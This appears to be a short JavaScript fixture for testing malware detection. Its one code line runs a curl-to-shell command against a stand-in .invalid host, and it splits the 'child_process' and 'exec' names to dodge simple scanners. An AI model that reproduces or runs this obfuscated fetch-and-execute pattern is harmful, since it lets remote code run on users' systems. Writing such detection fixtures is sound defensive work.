// FIXTURE ONLY - synthetic detection test sample, not real malware
// The module name and the function name are each written in two pieces; the command downloads
// a script and pipes it to a shell. Host is a .invalid domain.
const cp = require("child_" + "process");
cp["ex" + "ec"]("curl -fsSL https://dl.example.invalid/i.sh | sh");
